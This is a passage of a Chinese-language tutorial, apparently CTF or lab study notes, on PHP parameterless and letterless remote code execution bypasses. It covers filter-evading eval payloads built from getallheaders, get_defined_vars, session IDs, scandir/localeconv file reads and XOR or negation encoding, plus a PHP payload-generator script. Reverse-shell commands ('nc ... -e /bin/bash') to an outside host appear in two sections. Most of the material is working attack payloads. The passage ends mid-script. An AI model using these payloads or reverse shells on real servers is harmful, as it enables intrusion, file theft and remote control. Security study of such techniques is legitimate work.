<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>匹配</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;&#x27;== preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;,&quot;,$_GET[&#x27;code&#x27;])</span><br></pre></td></tr></table></figure>

<p>则调用eval执行code&#x3D;’phpinfo();”，phpinfo()被替换为空，<br>则</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(&#x27;&#x27;/[^\W]+\((?R)?\)/&#x27;, &quot;,$_GET[&#x27;code&#x27;])=&#x27;;&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="HTTP请求头绕过-php7-3"><a href="#HTTP请求头绕过-php7-3" class="headerlink" title="HTTP请求头绕过(php7.3)"></a>HTTP请求头绕过(php7.3)</h3><p>getallheaders()</p>
<p>获取所有HTTP请求标头</p>
<p>?code&#x3D;print_r(getallheaders());读取头部信息倒叙排列</p>
<p>写这个题记得要换到php7.3的环境   php5的环境这些函数应该还不能用</p>
<p><img src="/../picture/image-20250422204357389.png" alt="image-20250422204357389"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(pos(getallheaders()));</span><br></pre></td></tr></table></figure>

<p>pos()把第一项的值显示出来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(end(getallheaders()));</span><br></pre></td></tr></table></figure>

<p>end()把最后一项的值显示出来</p>
<p>apache_request_headers()</p>
<p>功能与getallheaders()相似，适用于Apache服务器</p>
<p><img src="/../picture/image-20250422204809434.png" alt="image-20250422204809434"></p>
<p>可以利用system(‘nc 192.168.248.130 -e \bin\bash’);进行shell反弹</p>
<h2 id="0x17无参数全局变量RCE-php5-7"><a href="#0x17无参数全局变量RCE-php5-7" class="headerlink" title="0x17无参数全局变量RCE(php5&#x2F;7)"></a>0x17无参数全局变量RCE(php5&#x2F;7)</h2><p>全局变量RCE</p>
<p>get_defined_vars()</p>
<p>返回所有已定义变量的值，所组成的数组</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(get_defined_vars());</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250423195215093.png" alt="image-20250423195215093"></p>
<p>返回数组顺序为GET&gt;POST&gt;COOKIE&gt;FILES</p>
<p><strong><code>FILES</code> 是 PHP 中的一个超级全局变量，准确地说是 <code>$_FILES</code>。它用于处理通过 HTTP POST 方法上传的文件。</strong></p>
<p>当你使用 <code>&lt;form enctype=&quot;multipart/form-data&quot; method=&quot;post&quot;&gt;</code> 上传文件时：</p>
<p>你表单中形如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;upload&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当用户提交这个表单并上传文件后，PHP 会自动将上传的文件信息存放在 <code>$_FILES</code> 数组中。</p>
<hr>
<p><code>$_FILES</code> 的结构示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [upload] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">        (</span><br><span class="line">            [name] =&gt; example.png</span><br><span class="line">            [type] =&gt; image/png</span><br><span class="line">            [tmp_name] =&gt; /tmp/phpYzdqkD</span><br><span class="line">            [error] =&gt; <span class="number">0</span></span><br><span class="line">            [size] =&gt; <span class="number">12345</span></span><br><span class="line">        )</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>字段说明：</p>
<ul>
<li><code>name</code>: 上传文件的原始名称。</li>
<li><code>type</code>: MIME 类型。</li>
<li><code>tmp_name</code>: 临时文件在服务器上的路径（存储在 PHP 的临时目录中）。</li>
<li><code>error</code>: 错误代码（0 表示上传成功）。</li>
<li><code>size</code>: 文件大小（单位：字节）。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(pos(get_defined_vars()));&amp;cmd=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250423195336637.png" alt="image-20250423195336637"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(end(pos(get_defined_vars())));&amp;cmd=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250423195354834.png" alt="image-20250423195354834"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=assert(end(pos(get_defined_vars())));&amp;cmd=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>

<p>把print_r换成eval、assert即可执行命令system(‘ls’);</p>
<p><img src="/../picture/image-20250423195430751.png" alt="image-20250423195430751"></p>
<h2 id="0x18无参数session-RCE"><a href="#0x18无参数session-RCE" class="headerlink" title="0x18无参数session RCE"></a>0x18无参数session RCE</h2><h3 id="利用session-php5"><a href="#利用session-php5" class="headerlink" title="利用session(php5)"></a><strong>利用session(php5)</strong></h3><p>session_start()</p>
<p>启动新会话或者重用现有会话，成功开始会返回TRUE，反之返回FALSE</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(session_start());</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250423195814031.png" alt="image-20250423195814031"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(session_id(session_start()));</span><br></pre></td></tr></table></figure>

<p>返回PHPSESSID的值</p>
<p>可以使用burpsuite修改PHPSESSID的值</p>
<p><img src="/../picture/image-20250423200221727.png" alt="image-20250423200221727"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure>

<p>print_r修改为show_source()</p>
<p>用burpsuite修改PHPSESSID的值为.&#x2F;flag</p>
<p>用show_source读取flag文件源代码</p>
<p><img src="/../picture/image-20250423200416773.png" alt="image-20250423200416773"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=eval(session_id(session_start()));</span><br></pre></td></tr></table></figure>

<p>修改外部函数eval()</p>
<p>修改PHPSESSID的值为命令’phpinfo();’</p>
<p>无法直接执行  因为PHPSESSID的值里不能一些有特殊符号</p>
<p>先把命令’phpinfo();’HEX编码转为十六进制，写入PHPSESSID</p>
<p>再用hex2bin()函数将十六进制转换为二进制（原始）数据，用eval执行</p>
<p>PHPSESSID&#x3D;706870696e666f28293b</p>
<p><img src="/../picture/image-20250423200940153.png" alt="image-20250423200940153"></p>
<p><strong>但是TGCTF2025里有一道题（ AAA偷渡阴平（复仇））  session_start()的用法不一样   复现平台在<a target="_blank" rel="noopener" href="https://ctf.xidian.edu.cn/">https://ctf.xidian.edu.cn/</a></strong></p>
<h3 id="AAA偷渡阴平（复仇）与本靶场的比较"><a href="#AAA偷渡阴平（复仇）与本靶场的比较" class="headerlink" title="AAA偷渡阴平（复仇）与本靶场的比较"></a>AAA偷渡阴平（复仇）与本靶场的比较</h3><p><img src="/../picture/image-20250423202321836.png" alt="image-20250423202321836"></p>
<p>这个是上面靶场的题</p>
<p>执行session_start();system(hex2bin(session_id(session_start()))); 是没有正常执行的</p>
<p><img src="/../picture/image-20250423202348671.png" alt="image-20250423202348671"></p>
<p>这是TGCTF的题执行session_start();system(hex2bin(session_id(session_start()))); 是可以正常执行的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(hex2bin(session_id(session_start()))); </span><br></pre></td></tr></table></figure>

<p>而上面靶场的题执行这个是可以成功执行的   TGCTF的题不可以</p>
<p><img src="/../picture/image-20250423202525757.png" alt="image-20250423202525757"></p>
<p><img src="/../picture/image-20250423202533828.png" alt="image-20250423202533828"></p>
<p>然后在上面靶场的php7环境下试了一下TGCTF的payload仍然没有反应  当然这个靶场里原来php5环境里可以用的payload也不可以用</p>
<p>具体不知道是什么环境问题</p>
<h2 id="0x19无参数scandir读取"><a href="#0x19无参数scandir读取" class="headerlink" title="0x19无参数scandir读取"></a>0x19无参数scandir读取</h2><p><strong>利用scandir()进行文件读取</strong>   （只能进行文件读取）</p>
<h3 id="当前目录"><a href="#当前目录" class="headerlink" title="当前目录"></a>当前目录</h3><h4 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a><strong>scandir()</strong></h4><p>类似ls，在某文件路径下，把内容以列表形式显示出来</p>
<ul>
<li>scandir()——列出指定路径中的文件和目录(php5,7,8)</li>
<li>getcwd()——取得当前工作目录(php4,5,7,8)</li>
<li>current()——返回数组中的第一项的值(php4,5,7,8)</li>
<li>array_reverse()——返回单元顺序相反的数组(php4,5,7,8)</li>
<li>array_flip()——交换数组中的键和值(php4,5,7,8)</li>
<li>next()——将数组中的内部指针向前移动（其实就是到了数组里的下一个键和值）</li>
<li>array_rand()——从数组中随机取出一个或多个随机键</li>
<li>chdir()——系统调用函数(同cd)，用于改变当前工作目录</li>
<li>strrev()——用于反转给定的字符串</li>
<li>crypt()——用来加密，目前Linux平台上加密的方法大致有MD5,DES,3 DES</li>
<li>hebrevc()——把希伯来文本从右至左的流转换为从左至右的流</li>
</ul>
<p>查看当前目录文件名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(localeconv());</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250423205419114.png" alt="image-20250423205419114"></p>
<p>localeconv();显示的数组第一项为”.”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(current(localeconv()));</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250423205607725.png" alt="image-20250423205607725"></p>
<p>current()功能同pos()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250423205937869.png" alt="image-20250423205937869"></p>
<p>scandir()读取当前目录”.”下所有文件名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(array_reverse(scandir(current(localeconv()))));</span><br></pre></td></tr></table></figure>

<p>倒序</p>
<p><img src="/../picture/image-20250423210537457.png" alt="image-20250423210537457"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(current(array_reverse(scandir(current(localeconv)))));</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250423211103165.png" alt="image-20250423211103165"></p>
<p>读取当前目录文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=show_source(current(array_reverse(scandir(current(localeconv()))));</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250423211307372.png" alt="image-20250423211307372"></p>
<h4 id="getcwd"><a href="#getcwd" class="headerlink" title="getcwd"></a>getcwd</h4><p>查看和读取当前目录文件   getcwd()当前目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(getcwd());</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250423211426813.png" alt="image-20250423211426813"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(scandir(getcwd()));</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250423211535294.png" alt="image-20250423211535294"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(end(scandir(getcwd())));</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250423211631665.png" alt="image-20250423211631665"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=show_source(end(scandir(getcwd())));</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250423211708274.png" alt="image-20250423211708274"></p>
<h3 id="上级目录"><a href="#上级目录" class="headerlink" title="上级目录"></a>上级目录</h3><p>查看上一级目录文件名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(getcwd());</span><br></pre></td></tr></table></figure>

<p>getcwd()当前目录</p>
<p><img src="/../picture/image-20250423212055150.png" alt="image-20250423212055150"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(dirname(getcwd()));</span><br></pre></td></tr></table></figure>

<p>dirname()上一级目录</p>
<p><img src="/../picture/image-20250423212046698.png" alt="image-20250423212046698"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(scandir(dirname(getcwd())));</span><br></pre></td></tr></table></figure>

<p>查看上一级目录文件名</p>
<p><img src="/../picture/image-20250423212133738.png" alt="image-20250423212133738"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(scandir(next(scandir(getcwd()))));</span><br></pre></td></tr></table></figure>

<p>效果相同    因为第二个元素是  ..   也是上级目录的意思</p>
<p><img src="/../picture/image-20250423212356787.png" alt="image-20250423212356787"></p>
<p>读取上一级目录文件名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure>

<p>这会随机读取上一级目录中的一个文件的内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code=show_source(array_rand(arry_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));</span><br><span class="line">?code=show_source(array_rand(arry_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrev(crypt(phpversion())))))))))))))));</span><br></pre></td></tr></table></figure>



<h3 id="根目录"><a href="#根目录" class="headerlink" title="根目录"></a>根目录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(array());</span><br><span class="line">?code=print_r(serialize(array()));</span><br></pre></td></tr></table></figure>

<p>serialize序列化</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(crypt(serialize(array())));</span><br></pre></td></tr></table></figure>

<p>末尾可能出现    &#x2F;</p>
<p>crypt单向字符串散列加密，结果随机</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(strrev(crypt(serialize(array()))));</span><br></pre></td></tr></table></figure>

<p>反转  让开头可能出现  &#x2F;</p>
<p>strrev  倒序</p>
<p>ord()函数和chr()函数</p>
<p>只能对第一个字符进行转码   ord()编码   chr()解码</p>
<p><code>ord(x)</code>：把<strong>单个字符</strong>变成<strong>Unicode码点</strong>（整数）  在下面paylaod这里  他只能取第一个字符</p>
<p><code>chr(x)</code>：把<strong>整数</strong>变成对应的<strong>字符</strong>       所以就有可能通过ord()  将  &#x2F;  编码  再通过chr()解码   来得到  &#x2F;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(chr(ord(strrev(crypt(serialize(array()))))));</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250427195127591.png" alt="image-20250427195127591"></p>
<p>scandir  列出根目录中的文件和目录   查看根目录文件名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(scandir(chr(ord(strrev(crypt(serialize(array()))))));</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250427195513499.png" alt="image-20250427195513499"></p>
<p>最后通过array_flip()反转键和键值   array_rand()随机读取键    show_source()展示源码</p>
<p>?code&#x3D;show_source(array_rand(array_flip(scandir(chr(ord(strrev(crypt(serialize(array())))))))));</p>
<p>这里还得拿chdir()把目录固定一下   dirname()取上级目录 (取目录的父级)</p>
<p><img src="/../picture/image-20250427201509100.png" alt="image-20250427201509100"></p>
<p>这个就是 &#x2F;flag里的内容</p>
<p>这里也可以通过burpsuite的intruder模块进行爆破无限发包访问</p>
<p><img src="/../picture/image-20250427201615308.png" alt="image-20250427201615308"></p>
<h2 id="0x20无字母数字异或运算绕过"><a href="#0x20无字母数字异或运算绕过" class="headerlink" title="0x20无字母数字异或运算绕过"></a>0x20无字母数字异或运算绕过</h2><p>异或运算poc</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$shell</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="variable">$result1</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$result2</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">judge</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$c</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$num</span>=<span class="number">0</span>;<span class="variable">$num</span>&lt;=<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>);<span class="variable">$num</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$x</span>=<span class="number">33</span>;<span class="variable">$x</span>&lt;=<span class="number">126</span>;<span class="variable">$x</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$y</span>=<span class="number">33</span>;<span class="variable">$y</span>&lt;=<span class="number">126</span>;<span class="variable">$y</span>++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>)))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable">$f</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>)^<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$f</span> == <span class="variable">$shell</span>[<span class="variable">$num</span>])</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="variable">$result1</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>);</span><br><span class="line">                        <span class="variable">$result2</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                        <span class="keyword">break</span> <span class="number">2</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;异或运算第一部分： &quot;</span>.<span class="variable">$result1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;异或运算第二部分： &quot;</span>.<span class="variable">$result2</span>; </span><br></pre></td></tr></table></figure>

<h3 id="PHP5"><a href="#PHP5" class="headerlink" title="PHP5"></a>PHP5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">asset  异或结果   &quot;!((%)(&quot;^&quot;@[[@[\&quot;   需要加个转义字符   &quot;!((%)(&quot;^&quot;@[[@[\\&quot;</span><br><span class="line">_POST  异或结果   &quot;!+/((&quot;^&quot;~&#123;`&#123;|&quot;</span><br><span class="line">?cmd=$_=&quot;!((%)(&quot;^&quot;@[[@[\\&quot;;$__=&quot;!+/((&quot;^&quot;~&#123;`&#123;|&quot;;$___=$$__;$_($___[&#x27;_&#x27;]);</span><br><span class="line">?cmd=%24_%3D%20%22!((%25)(%22%5E%22%40%5B%5B%40%5B%5C%5C%22%3B%24__%3D%22!%2B%2F((%22%5E%22~%7B%60%7B%7C%22%3B%24___%3D%24%24__%3B%24_(%24___%5B&#x27;_&#x27;%5D)%3B</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250427205028463.png" alt="image-20250427205028463"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%24_%3D%22%2B(%2B).%26%2F%22%5E%22%5B%40%5B%40%40%40%40%22%3B%24_()%3B</span><br><span class="line">?cmd=$_=&quot;+(+).&amp;/&quot;^&quot;[@[@@@@&quot;;$_();</span><br></pre></td></tr></table></figure>

<p>phpinfo();</p>
<p><img src="/../picture/image-20250427205615557.png" alt="image-20250427205615557"></p>
<h3 id="PHP7"><a href="#PHP7" class="headerlink" title="PHP7"></a>PHP7</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">`$_POST[_]`;     </span><br><span class="line">_POST   -&gt;   &quot;!+/((&quot;^&quot;~&#123;`&#123;|&quot;</span><br><span class="line">?cmd=$_=&quot;!+/((&quot;^&quot;~&#123;`&#123;|&quot;;$__=$$_;`$__[_]`;</span><br></pre></td></tr></table></figure>

<p>urlencode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%24_%3D%22!%2B%2F((%22%5E%22~%7B%60%7B%7C%22%3B%24__%3D%24%24_%3B%60%24__%5B_%5D%60%3B</span><br></pre></td></tr></table></figure>

<p>post提交  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_=nc 服务器ip 端口号 -e /bin/bash</span><br></pre></td></tr></table></figure>

<p>进行反弹shell</p>
<p><img src="/../picture/image-20250427210326979.png" alt="image-20250427210326979"></p>
<h2 id="0x21无字母数字取反绕过"><a href="#0x21无字母数字取反绕过" class="headerlink" title="0x21无字母数字取反绕过"></a>0x21无字母数字取反绕过</h2><p>poc</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$shell</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$result</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span> =<span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$word</span> = <span 